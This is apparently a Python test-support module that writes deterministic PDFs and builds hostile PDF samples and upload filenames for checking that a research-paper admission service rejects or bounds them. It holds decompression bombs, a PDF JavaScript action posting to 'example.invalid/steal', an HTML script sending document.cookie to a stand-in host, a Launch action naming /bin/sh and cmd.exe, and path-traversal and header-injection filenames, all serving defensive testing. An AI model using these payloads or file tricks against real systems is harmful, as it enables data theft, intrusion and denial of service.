"""Test-only deterministic PDF writer and hostile PDF builders (standard library only).

Copied from the Owner 5 evaluation harness (evaluation/drbean_eval/pdfwrite.py and hostile_pdfs.py), with
page rotation added and limits adapted to general research admission (paper profile v2: 25 MiB PDFs, 20 pages).

Native-text pages use the standard Type 1 fonts with WinAnsiEncoding, so no font is embedded. Output is
byte-for-byte reproducible because there are no timestamps or random ids, which lets sealed files be committed
by digest. This is an authoring tool for the evaluation corpus. It is not a PDF parser, and the product never uses
it as an oracle for what a paper says: gold fields come from inspecting independent renderings.
"""
from __future__ import annotations

import zlib

FONTS = {"F1": "Helvetica", "F2": "Helvetica-Bold", "F3": "Helvetica-Oblique", "F4": "Times-Roman",
         "F5": "Courier"}

# Helvetica advance widths (1/1000 em), standard AFM metrics for the characters used by the corpus.
_HELVETICA = {" ": 278, "!": 278, '"': 355, "#": 556, "$": 556, "%": 889, "&": 667, "'": 191, "(": 333, ")": 333,
              "*": 389, "+": 584, ",": 278, "-": 333, ".": 278, "/": 278, ":": 278, ";": 278, "<": 584, "=": 584,
              ">": 584, "?": 556, "@": 1015, "[": 278, "\\": 278, "]": 278, "^": 469, "_": 556, "`": 333, "{": 334,
              "|": 260, "}": 334, "~": 584, "µ": 556, "±": 584, "×": 584, "–": 556, "—": 1000, "°": 400, "·": 278,
              "‘": 222, "’": 222, "“": 333, "”": 333, "≤": 584, "≥": 584}
_HELVETICA.update({d: 556 for d in "0123456789"})
_HELVETICA.update(dict(zip("ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                           (667, 667, 722, 722, 667, 611, 778, 722, 278, 500, 667, 556, 833, 722, 778, 667, 778, 722,
                            667, 611, 722, 667, 944, 667, 667, 611))))
_HELVETICA.update(dict(zip("abcdefghijklmnopqrstuvwxyz",
                           (556, 556, 500, 556, 556, 278, 556, 556, 222, 222, 500, 222, 833, 556, 556, 556, 556, 333,
                            500, 278, 556, 500, 722, 500, 500, 500))))


def text_width(text: str, size: float, font: str = "F1") -> float:
    """Approximate advance width in points (Helvetica metrics; bold widened by 5%, others treated alike)."""
    base = sum(_HELVETICA.get(ch, 600) for ch in text) * size / 1000.0
    return base * (1.05 if font == "F2" else 1.0)


def _literal(text: str) -> bytes:
    data = text.encode("cp1252")  # raises on characters WinAnsi cannot show, so nothing is silently replaced
    return b"(" + data.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)") + b")"


def wrap(text: str, width: float, size: float, font: str = "F1") -> list[str]:
    lines, current = [], ""
    for word in text.split():
        candidate = f"{current} {word}".strip()
        if current and text_width(candidate, size, font) > width:
            lines.append(current)
            current = word
        else:
            current = candidate
    if current:
        lines.append(current)
    return lines


class Page:
    def __init__(self, document: "Document", width: float, height: float):
        self.document, self.width, self.height = document, width, height
        self.rotate = 0
        self.ops: list[bytes] = []
        self.images: dict[str, int] = {}
        self.annotations: list[int] = []

    def text(self, x: float, y: float, text: str, *, size: float = 10, font: str = "F1", gray: float = 0.0,
             render: int = 0) -> None:
        """Place one line. ``gray`` 1.0 is white; ``render`` 3 is invisible (text layer only)."""
        self.ops.append(b"BT /%s %.2f Tf %.3f g %d Tr %.2f %.2f Td %s Tj ET" % (
            font.encode(), size, gray, render, x, y, _literal(text)))

    def paragraph(self, x: float, y: float, width: float, text: str, *, size: float = 10, font: str = "F1",
                  leading: float | None = None, gray: float = 0.0) -> float:
        """Wrap ``text`` into ``width``; returns the baseline below the last line."""
        leading = leading or size * 1.32
        for line in wrap(text, width, size, font):
            self.text(x, y, line, size=size, font=font, gray=gray)
            y -= leading
        return y

    def line(self, x1: float, y1: float, x2: float, y2: float, *, width: float = 0.6) -> None:
        self.ops.append(b"%.2f w %.2f %.2f m %.2f %.2f l S" % (width, x1, y1, x2, y2))

    def rect(self, x: float, y: float, w: float, h: float, *, width: float = 0.6, fill: float | None = None) -> None:
        if fill is None:
            self.ops.append(b"%.2f w %.2f %.2f %.2f %.2f re S" % (width, x, y, w, h))
        else:
            self.ops.append(b"%.3f g %.2f %.2f %.2f %.2f re f 0 g" % (fill, x, y, w, h))

    def jpeg(self, data: bytes, pixel_width: int, pixel_height: int, x: float, y: float, w: float, h: float, *,
             gray: bool = False) -> None:
        name = f"Im{len(self.images) + 1}"
        number = self.document.add_stream(
            b"/Type /XObject /Subtype /Image /Width %d /Height %d /ColorSpace /%s /BitsPerComponent 8 "
            b"/Filter /DCTDecode" % (pixel_width, pixel_height, b"DeviceGray" if gray else b"DeviceRGB"), data,
            compress=False)
        self.images[name] = number
        self.ops.append(b"q %.2f 0 0 %.2f %.2f %.2f cm /%s Do Q" % (w, h, x, y, name.encode()))

    def raw(self, operators: bytes) -> None:
        self.ops.append(operators)


class Document:
    def __init__(self, title: str, *, size: tuple[float, float] = (612, 792), compress: bool = True,
                 producer: str = "drbean general-research tests (no timestamps)"):
        self.title, self.size, self.compress, self.producer = title, size, compress, producer
        self.objects: list[bytes | None] = []
        self.pages: list[Page] = []
        self.catalog_extra: dict[str, bytes] = {}
        self.trailer_extra: dict[str, bytes] = {}
        self.info_extra: dict[str, str] = {}

    def reserve(self) -> int:
        self.objects.append(None)
        return len(self.objects)

    def add_object(self, body: bytes, number: int | None = None) -> int:
        if number is None:
            self.objects.append(body)
            return len(self.objects)
        self.objects[number - 1] = body
        return number

    def add_stream(self, dictionary: bytes, data: bytes, *, compress: bool | None = None) -> int:
        compress = self.compress if compress is None else compress
        payload = zlib.compress(data, 9) if compress else data
        flate = b" /Filter /FlateDecode" if compress else b""
        return self.add_object(b"<< %s%s /Length %d >>\nstream\n%s\nendstream" % (dictionary, flate, len(payload),
                                                                                   payload))

    def page(self) -> Page:
        page = Page(self, *self.size)
        self.pages.append(page)
        return page

    def to_bytes(self) -> bytes:
        font_refs = {}
        for key, base in FONTS.items():
            font_refs[key] = self.add_object(b"<< /Type /Font /Subtype /Type1 /BaseFont /%s /Encoding "
                                             b"/WinAnsiEncoding >>" % base.encode())
        pages_number = self.reserve()
        kids = []
        for page in self.pages:
            content = self.add_stream(b"", b"\n".join(page.ops))
            fonts = b" ".join(b"/%s %d 0 R" % (k.encode(), v) for k, v in font_refs.items())
            xobjects = b" ".join(b"/%s %d 0 R" % (k.encode(), v) for k, v in page.images.items())
            resources = b"<< /Font << %s >>%s >>" % (fonts, b" /XObject << %s >>" % xobjects if xobjects else b"")
            annots = b" /Annots [%s]" % b" ".join(b"%d 0 R" % a for a in page.annotations) if page.annotations \
                else b""
            rotate = b" /Rotate %d" % page.rotate if page.rotate else b""
            kids.append(self.add_object(b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 %.0f %.0f]%s /Resources %s "
                                        b"/Contents %d 0 R%s >>" % (pages_number, page.width, page.height, rotate,
                                                                    resources, content, annots)))
        self.add_object(b"<< /Type /Pages /Kids [%s] /Count %d >>" % (b" ".join(b"%d 0 R" % k for k in kids),
                                                                      len(kids)), pages_number)
        extra = b"".join(b" /%s %s" % (k.encode(), v) for k, v in self.catalog_extra.items())
        catalog = self.add_object(b"<< /Type /Catalog /Pages %d 0 R%s >>" % (pages_number, extra))
        info_items = {"Title": self.title, "Producer": self.producer, **self.info_extra}
        info = self.add_object(b"<< %s >>" % b" ".join(b"/%s %s" % (k.encode(), _literal(v))
                                                         for k, v in info_items.items()))
        out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        for number, body in enumerate(self.objects, 1):
            if body is None:
                raise ValueError(f"object {number} reserved but never written")
            offsets.append(len(out))
            out += b"%d 0 obj\n%s\nendobj\n" % (number, body)
        xref = len(out)
        out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(self.objects) + 1)
        out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
        trailer_extra = b"".join(b" /%s %s" % (k.encode(), v) for k, v in self.trailer_extra.items())
        out += b"trailer\n<< /Size %d /Root %d 0 R /Info %d 0 R%s >>\nstartxref\n%d\n%%%%EOF\n" % (
            len(self.objects) + 1, catalog, info, trailer_extra, xref)
        return bytes(out)


# ---------------------------------------------------------------- hostile PDF builders
import hashlib  # noqa: E402
import struct  # noqa: E402

MiB = 1024 * 1024
PAD = bytes.fromhex("28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A")

# expected: reject_before_parse | reject_safely | reject_or_recover | bounded | page_cap | no_active_content | not_a_pdf
ASSETS = {
    "truncated": ("reject_safely", "valid header, file cut before xref and trailer"),
    "garbage-xref": ("reject_or_recover", "startxref points past the end; xref is noise (refusal or bounded "
                                          "reconstruction from the object stream are both safe)"),
    "password-protected": ("reject_safely", "standard security handler (RC4 40-bit) with a user password; text "
                                            "cannot be read without it and must not be guessed"),
    "pages-over-cap": ("page_cap", "one page more than the PDF admission page cap"),
    "pages-2000": ("page_cap", "2000 tiny pages in a small file; the cap must apply before per-page work"),
    "oversize-pdf": ("reject_before_parse", "1 MiB above the PDF byte cap, padded with an unreferenced stream"),
    "inflate-bomb": ("bounded", "one content stream that inflates from about 128 KiB to 128 MiB"),
    "image-dimension-bomb": ("bounded", "image XObject declaring 60000 x 60000 RGB pixels with a tiny stream"),
    "image-inflate-bomb": ("bounded", "12000 x 12000 grayscale image (144 MB raw) compressed to well under 1 MiB"),
    "nested-arrays": ("bounded", "an object nested 50000 arrays deep (parser recursion)"),
    "page-tree-cycle": ("reject_safely", "the page tree lists its own Pages node as a kid (infinite walk)"),
    "huge-xref-size": ("reject_or_recover", "trailer /Size 2147483647 (no allocation may follow the declared "
                                            "count; refusal or ignoring it are both safe)"),
    "javascript-openaction": ("no_active_content", "OpenAction and page AA JavaScript; must never run or be "
                                                   "surfaced as an instruction"),
    "launch-and-uri-actions": ("no_active_content", "Launch action naming an executable and a URI action to an "
                                                    "external host; never followed"),
    "embedded-attachment": ("no_active_content", "an EmbeddedFiles attachment holding a script; never extracted, "
                                                 "executed or analysed as paper content"),
    "html-polyglot": ("not_a_pdf", "HTML with a script, PDF header only after 600 bytes"),
    "png-bytes-named-pdf": ("not_a_pdf", "a real PNG uploaded as application/pdf"),
    "header-only": ("reject_safely", "the 9-byte header %PDF-1.4 and nothing else"),
    "empty": ("reject_before_parse", "zero bytes"),
}
# Upload names for routes that take a filename (the current image route takes none).
HOSTILE_FILENAMES = ["../../../../etc/passwd.pdf", "..\\..\\..\\windows\\win.ini.pdf", "paper\x00.pdf.exe",
                     "a" * 300 + ".pdf", "‮fdp.exe", "CON.pdf", ".hidden.pdf", "paper.pdf/../../escape.pdf",
                     "%2e%2e%2fescape.pdf", "paper\r\nX-Injected: 1.pdf"]


def _simple(title: str, pages: int = 1, text: str = "Synthetic hostile-resource probe page.") -> Document:
    doc = Document(title)
    for number in range(pages):
        page = doc.page()
        page.text(72, 720, f"{text} Page {number + 1} of {pages}.", size=10)
    return doc


def _rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out, i, j = bytearray(), 0, 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def _padded(password: bytes) -> bytes:
    return (password + PAD)[:32]


def encrypted_pdf(user_password: bytes = b"drbean-user", owner_password: bytes = b"drbean-owner") -> tuple[bytes, dict]:
    """A one-page PDF under the standard security handler (V1, R2, 40-bit RC4). Returns (bytes, key material)."""
    file_id = hashlib.md5(b"drbean-hostile-encrypted").digest()
    owner_key = hashlib.md5(_padded(owner_password)).digest()[:5]
    o_entry = _rc4(owner_key, _padded(user_password))
    permissions = -44  # printing and copying denied
    key = hashlib.md5(_padded(user_password) + o_entry + struct.pack("<i", permissions) + file_id).digest()[:5]
    u_entry = _rc4(key, PAD)

    def object_key(number: int) -> bytes:
        return hashlib.md5(key + struct.pack("<I", number)[:3] + b"\x00\x00").digest()[:10]

    content = b"BT /F1 12 Tf 72 720 Td (Encrypted synthetic paper: concentration 4.62 mg/L at 0.5 h.) Tj ET"
    secret = _rc4(object_key(4), content)
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> "
        b"/Contents 4 0 R >>",
        b"<< /Length %d >>\nstream\n%s\nendstream" % (len(secret), secret),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Filter /Standard /V 1 /R 2 /O <%s> /U <%s> /P %d >>" % (o_entry.hex().encode(), u_entry.hex().encode(),
                                                                     permissions),
    ]
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n%s\nendobj\n" % (number, body)
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R /Encrypt 6 0 R /ID [<%s> <%s>] >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objects) + 1, file_id.hex().encode(), file_id.hex().encode(), xref)
    return bytes(out), {"key": key, "object_key": object_key(4), "plaintext": content, "ciphertext": secret}


def _compressed_zeros(total: int, fill: bytes = b" ") -> bytes:
    compressor = zlib.compressobj(9)
    chunk = fill * MiB
    parts, remaining = [], total
    while remaining > 0:
        size = min(remaining, len(chunk))
        parts.append(compressor.compress(chunk[:size]))
        remaining -= size
    parts.append(compressor.flush())
    return b"".join(parts)


def _raw_pdf(objects: list[bytes], root: int, trailer_extra: bytes = b"", size: int | None = None) -> bytes:
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n%s\nendobj\n" % (number, body)
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
    out += b"trailer\n<< /Size %d /Root %d 0 R%s >>\nstartxref\n%d\n%%%%EOF\n" % (
        size if size is not None else len(objects) + 1, root, trailer_extra, xref)
    return bytes(out)


def _font_page(contents: int, extra_resources: bytes = b"", extra: bytes = b"") -> bytes:
    return (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >>%s >> "
            b"/Contents %d 0 R%s >>" % (extra_resources, contents, extra))


def _stream(data: bytes, dictionary: bytes = b"", *, compressed: bytes | None = None) -> bytes:
    if compressed is not None:
        return b"<< %s /Filter /FlateDecode /Length %d >>\nstream\n%s\nendstream" % (dictionary, len(compressed),
                                                                                    compressed)
    return b"<< %s /Length %d >>\nstream\n%s\nendstream" % (dictionary, len(data), data)


FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"
TEXT = b"BT /F1 12 Tf 72 720 Td (Synthetic hostile-resource probe.) Tj ET"


def build(name: str) -> bytes:
    if name == "truncated":
        data = _simple("Truncated probe", pages=3).to_bytes()
        return data[: int(len(data) * 0.6)]
    if name == "garbage-xref":
        body = _simple("Garbage xref probe").to_bytes()
        cut = body.rfind(b"xref")
        return body[:cut] + b"xref\n0 9\nnot an xref table at all\ntrailer\n<< /Size 9 >>\nstartxref\n999999999\n%%EOF\n"
    if name == "password-protected":
        return encrypted_pdf()[0]
    if name == "pages-over-cap":
        from bean_api.general_research import limits as L
        return _simple("One page over the cap", pages=L.MAX_PDF_PAGES + 1).to_bytes()
    if name == "pages-2000":
        return _simple("Two thousand pages", pages=2000, text="p").to_bytes()
    if name == "oversize-pdf":
        from bean_api.general_research import limits as L
        size = L.MAX_PDF_BYTES + MiB
        doc = _simple("Oversize probe")
        doc.add_object(b"<< /Length %d >>\nstream\n%s\nendstream" % (size, b"0" * size))
        return doc.to_bytes()
    if name == "inflate-bomb":
        bomb = _compressed_zeros(128 * MiB)
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5), _stream(b"", compressed=bomb)], root=1)
    if name == "image-dimension-bomb":
        tiny = zlib.compress(b"\x00" * 64, 9)
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, b" /XObject << /Im1 6 0 R >>"),
                         _stream(TEXT + b"\nq 400 0 0 400 100 200 cm /Im1 Do Q"),
                         _stream(b"", b"/Type /XObject /Subtype /Image /Width 60000 /Height 60000 "
                                      b"/ColorSpace /DeviceRGB /BitsPerComponent 8", compressed=tiny)], root=1)
    if name == "image-inflate-bomb":
        pixels = _compressed_zeros(12000 * 12000, fill=b"\x80")
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, b" /XObject << /Im1 6 0 R >>"),
                         _stream(TEXT + b"\nq 400 0 0 400 100 200 cm /Im1 Do Q"),
                         _stream(b"", b"/Type /XObject /Subtype /Image /Width 12000 /Height 12000 "
                                      b"/ColorSpace /DeviceGray /BitsPerComponent 8", compressed=pixels)], root=1)
    if name == "nested-arrays":
        depth = 50000
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /Deep 6 0 R >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT, _font_page(5), _stream(TEXT),
                         b"[" * depth + b"]" * depth], root=1)
    if name == "page-tree-cycle":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>",
                         b"<< /Type /Pages /Kids [2 0 R 4 0 R] /Count 2 >>", FONT, _font_page(5), _stream(TEXT)], root=1)
    if name == "huge-xref-size":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5), _stream(TEXT)], root=1, size=2147483647)
    if name == "javascript-openaction":
        script = b"app.alert('This script must never run.'); this.submitForm('https://example.invalid/steal');"
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names "
                         b"[(drbean) 6 0 R] >> >> >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, extra=b" /AA << /O 6 0 R >>"), _stream(TEXT),
                         b"<< /S /JavaScript /JS (%s) >>" % script], root=1)
    if name == "launch-and-uri-actions":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, extra=b" /Annots [7 0 R]"), _stream(TEXT),
                         b"<< /S /Launch /F (/bin/sh) /Win << /F (cmd.exe) /P (/c calc) >> /NewWindow true >>",
                         b"<< /Type /Annot /Subtype /Link /Rect [72 700 300 730] /A << /S /URI "
                         b"/URI (https://example.invalid/collect?paper=1) >> >>"], root=1)
    if name == "embedded-attachment":
        payload = b"print('this attachment must never be executed or read as paper content')\n"
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(payload.py) 6 0 R] "
                         b">> >> >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT, _font_page(5),
                         _stream(TEXT), b"<< /Type /Filespec /F (payload.py) /UF (payload.py) /EF << /F 7 0 R >> >>",
                         _stream(payload, b"/Type /EmbeddedFile /Subtype /text#2Fx-python")], root=1)
    if name == "html-polyglot":
        html = (b"<!doctype html><html><head><script>fetch('https://example.invalid/'+document.cookie)</script>"
                b"</head><body>" + b"<!-- padding -->" * 32 + b"</body></html>\n")
        return html + _simple("Polyglot probe").to_bytes()
    if name == "png-bytes-named-pdf":
        def chunk(kind, data):
            return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
        raw = b"".join(b"\x00" + b"\xff" * 8 for _ in range(8))
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 8, 8, 8, 0, 0, 0, 0))
                + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))
    if name == "header-only":
        return b"%PDF-1.4\n"
    if name == "empty":
        return b""
    raise KeyError(name)
